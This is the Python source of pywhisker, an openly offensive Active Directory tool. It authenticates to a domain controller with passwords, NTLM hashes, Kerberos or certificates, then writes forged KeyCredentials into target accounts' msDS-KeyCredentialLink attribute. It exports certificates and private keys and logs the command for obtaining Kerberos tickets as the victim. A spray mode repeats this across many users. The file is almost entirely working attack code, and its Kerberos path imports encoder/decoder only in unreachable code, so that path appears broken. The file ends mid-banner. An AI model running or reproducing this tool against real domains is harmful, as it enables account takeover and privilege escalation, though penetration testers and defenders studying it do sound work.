#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pywhisker.py
# Author             : Charlie Bromberg (@_nwodtuhs) & Podalirius (@podalirius_)
# Date created       : 29 Jul 2021
import json
import random
import string
import traceback
from binascii import unhexlify

from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars
import argparse
import ldap3
import ldapdomaindump
import os
import ssl
import sys

from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime

from rich.console import Console

def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName() + '.' + s.getServerDNSDomainName()

def init_ldap_schannel_connection(domain_controller, crt, key):
    """
    Initializes an LDAP connection using Schannel (certificate-based authentication).
    """
    #logger.debug("Creating LDAP connection using Schannel (TLS)")
    port = 636
    tls = ldap3.Tls(local_private_key_file=key, local_certificate_file=crt, validate=ssl.CERT_NONE)
    ldap_server_kwargs = {'use_ssl': True, 'port': port, 'tls': tls, 'get_info': ldap3.ALL}
    ldap_server = ldap3.Server(domain_controller, **ldap_server_kwargs)
    ldap_conn = ldap3.Connection(ldap_server)
    #logger.debug(f"Attempting to open connection to {domain_controller} on port {port}")
    ldap_conn.open()
    return ldap_server, ldap_conn

def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash, logger):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.use_kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, logger, domain, lmhash, nthash, args.auth_key, kdcHost=args.dc_ip)
    elif args.auth_hashes is not None:
        if lmhash == "":
            lmhash = "aad3b435b51404eeaad3b435b51404ee"
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash, logger):
    if args.use_schannel:
        target = args.dc_ip if args.dc_ip is not None else domain
        #self.logger.info("Using LDAP over Schannel (TLS) connection.")
        try:
            return init_ldap_schannel_connection(target, args.crt, args.key)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            raise Exception(f"[ERROR] Failed to open LDAP Schannel connection to {target}")
        
    if args.use_kerberos:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain

    if args.use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, args, domain, username, password, lmhash, nthash, logger)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, args, domain, username, password, lmhash, nthash, logger)
    else:
        return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash, logger)


    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
def ldap3_kerberos_login(connection, target, user, password, logger, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            # No cache present
            print(e)
            pass
        if ccache is not None:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                logger.debug('Domain retrieved from CCache: %s' % domain)

            logger.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
            principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logger.debug('Using TGT from cache')
                else:
                    logger.debug(f'Principal {principal} not found in cache')
            else:
                TGS = creds.toTGS(principal)
                logger.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True

class ShadowCredentials(object):
    def __init__(self, ldap_server, ldap_session, target_samname, target_domain=None, logger=None):
        super(ShadowCredentials, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.target_samname = target_samname
        self.target_dn = None
        self.target_domain_dn = ','.join(f'DC={component}' for component in target_domain.split('.')) if target_domain is not None else None
        if logger is None:
            self.logger = Logger(0,False)
        else:
            self.logger = logger
        self.logger.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf, root=self.target_domain_dn)


    def info(self, device_id):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                try:
                    keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                    if keyCredential.DeviceId is None:
                        self.logger.warning("Failed to parse DeviceId for keyCredential: %s" % (str(dn_binary_value)))
                        continue
                    if keyCredential.DeviceId.toFormatD() == device_id:
                        self.logger.success("Found device Id")
                        keyCredential.show()
                        device_id_in_current_values = True
                except Exception as err:
                    self.logger.warning("Failed to parse keyCredential, error: %s, raw keyCredential: %s" % (str(err), dn_binary_value.decode()))
                    self.logger.debug(traceback.format_exc())
            if not device_id_in_current_values:
                self.logger.warning("No value with the provided DeviceID was found for the target object")
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def list(self):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                self.logger.info('Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute')
            else:
                self.logger.info("Listing devices for %s" % self.target_samname)
                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                    try:
                        keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                        if keyCredential.DeviceId is None:
                            self.logger.warning("Failed to parse DeviceId for keyCredential: %s" % (str(dn_binary_value)))
                            self.logger.warning("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId, keyCredential.CreationTime))
                        else:
                            self.logger.info("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId.toFormatD(), keyCredential.CreationTime))
                    except Exception as err:
                        self.logger.warning("Failed to parse keyCredential, error: %s, raw keyCredential: %s" % (str(err), dn_binary_value.decode()))
                        self.logger.debug(traceback.format_exc())
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return

    def add(self, password, path, export_type, domain, target_domain):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.logger.info("Generating certificate")
        certificate = X509Certificate2(subject=self.target_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
        self.logger.info("Certificate generated")
        self.logger.info("Generating KeyCredential")
        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
        self.logger.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
        if self.logger.verbosity == 2:
            keyCredential.fromDNWithBinary(keyCredential.toDNWithBinary()).show()
        self.logger.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
            self.logger.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.ldap_session.result['result'] == 0:
                self.logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
                if path is None:
                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                    self.logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
                if export_type == "PEM":
                    certificate.ExportPEM(path_to_files=path)
                    self.logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
                    self.logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
                    self.logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    self.logger.verbose("Run the following command to obtain a TGT")
                    self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, target_domain if target_domain is not None else domain, self.target_samname, path))
                elif export_type == "PFX":
                    if password is None:
                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                        self.logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
                    certificate.ExportPFX(password=password, path_to_file=path)
                    self.logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                    self.logger.info("Must be used with password: %s" % password)
                    self.logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    self.logger.verbose("Run the following command to obtain a TGT")
                    self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, target_domain if target_domain is not None else domain, self.target_samname, path))
            else:
                if self.ldap_session.result['result'] == 50:
                    self.logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    self.logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    self.logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def spray(self, password, path, export_type, domain, target_domain):
        self.logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
        if type(self.target_samname) == str:
            self.target_samname = [self.target_samname]
        if path is None:
            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
            self.logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: <USERNAME>_%s" % path)
        if export_type == "PFX" and password is None:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
            self.logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
        targets_owned = []
        for samname in self.target_samname:
            result = self.get_dn_sid_from_samname(samname)
            if not result:
                #self.logger.error(f'Target account does not exist! (wrong domain?): {samname}')
                continue
            else:
                self.target_dn = result[0]
            certificate = X509Certificate2(subject=samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
            keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
            self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
            results = None
            for entry in self.ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
            if not results:
                #self.logger.error(f'Could not query target user properties: {samname}')
                continue
            try:
                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                if self.ldap_session.result['result'] == 0:
                    targets_owned.append(samname)
                    self.logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}")
                    if export_type == "PEM":
                        certificate.ExportPEM(path_to_files=f'{samname}_{path}')
                        self.logger.info(f"Saved PEM certificate for {samname} at path {samname + '_' + path + '_cert.pem'}, PEM private key at path {samname + '_' + path + '_priv.pem'}")
                    elif export_type == "PFX":
                        certificate.ExportPFX(password=password, path_to_file=f'{samname}_{path}')
                        self.logger.info(f"Saved PFX (#PKCS12) certificate & key for {samname} at path {samname + '_' + path + '.pfx'}, the password is {password}")
            except IndexError:
                self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        if not targets_owned:
            self.logger.warning("No user object was modified during the spray")
        else:
            self.logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
            self.logger.verbose("Run the following command to obtain a TGT")
            if export_type == "PEM":
                self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem <USERNAME>_%s_cert.pem -key-pem <USERNAME>_%s_priv.pem %s/<USERNAME> <USERNAME>.ccache" % (path, path, target_domain if target_domain is not None else domain))
            elif export_type == "PFX":
                self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx <USERNAME>_%s.pfx -pfx-pass %s %s/<USERNAME> <USERNAME>.ccache" % (path, password, target_domain if target_domain is not None else domain))


    def remove(self, device_id):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            new_values = []
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                if keyCredential.DeviceId is None:
                    self.logger.warning("Failed to parse DeviceId for keyCredential: %s" % (str(dn_binary_value)))
                    continue
                if keyCredential.DeviceId.toFormatD() == device_id:
                    self.logger.info("Found value to remove")
                    device_id_in_current_values = True
                else:
                    new_values.append(dn_binary_value)
            if device_id_in_current_values:
                self.logger.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                if self.ldap_session.result['result'] == 0:
                    self.logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
                else:
                    if self.ldap_session.result['result'] == 50:
                        self.logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        self.logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        self.logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
            else:
                self.logger.error("No value with the provided DeviceID was found for the target object")
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def clear(self):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                self.logger.info('Attribute msDS-KeyCredentialLink is empty')
            else:
                self.logger.info("Clearing the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
                if self.ldap_session.result['result'] == 0:
                    self.logger.success('msDS-KeyCredentialLink cleared successfully!')
                else:
                    if self.ldap_session.result['result'] == 50:
                        self.logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        self.logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        self.logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
                return
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def importFromJSON(self, filename):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            if os.path.exists(filename):
                keyCredentials = []
                with open(filename, "r") as f:
                    data = json.load(f)
                    for kcjson in data["keyCredentials"]:
                        if type(kcjson) == dict:
                            keyCredentials.append(KeyCredential.fromDict(kcjson).toDNWithBinary().toString())
                        elif type(kcjson) == str:
                            keyCredentials.append(kcjson)
            self.logger.info("Modifying the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, keyCredentials]})
            if self.ldap_session.result['result'] == 0:
                self.logger.success('msDS-KeyCredentialLink modified successfully!')
            else:
                if self.ldap_session.result['result'] == 50:
                    self.logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    self.logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    self.logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
            return
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def exportToJSON(self, filename):
        self.logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            self.logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            self.logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            self.logger.error('Could not query target user properties')
            return
        try:
            if filename is None:
                filename = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8)) + ".json"
                self.logger.verbose("No filename was provided. The keyCredential(s) will be stored with the filename: %s" % filename)
            if len(os.path.dirname(filename)) != 0:
                if not os.path.exists(os.path.dirname(filename)):
                    os.makedirs(os.path.dirname(filename), exist_ok=True)
            keyCredentialsJSON = {"keyCredentials":[]}
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                try:
                    keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                    keyCredentialsJSON["keyCredentials"].append(keyCredential.toDict())
                except Exception as e:
                    self.logger.warning(f"Failed to serialize keyCredential, error: %s, saving the raw keyCredential instead, i.e.: %s" % (str(e), dn_binary_value.decode()))
                    keyCredentialsJSON["keyCredentials"].append(dn_binary_value.decode())
            with open(filename, "w") as f:
                f.write(json.dumps(keyCredentialsJSON, indent=4))
            self.logger.success("Saved JSON dump at path: %s" % filename)
        except IndexError:
            self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def get_dn_sid_from_samname(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            self.logger.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            self.logger.error('SID not found in LDAP: %s' % sid)
            return False


class Logger(object):
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet
        self.console = Console()
        if verbosity == 3:
            print("(╯°□°）╯︵ ┻━┻ WHAT HAVE YOU DONE !? (╯°□°）╯︵ ┻━┻")
            exit(0)
        elif verbosity == 4:
            art = """


    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡿⠟⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠋⠛⠿⣿⣿
    ⠋⠉⠁⠄⠄⠄⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⣿⡀⠄⠄⠄⠄⢹
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠉⠛⠿⢦⣀⡀⡀⠄
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣀
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⠄⠄⣿
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠄⠄⠘⠀⠀⠀⠀⠀⠀
    
⠀The best tools in the history of tools. Ever.
"""
            print(art)
            exit(0)
        elif verbosity == 5:
            art = """

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
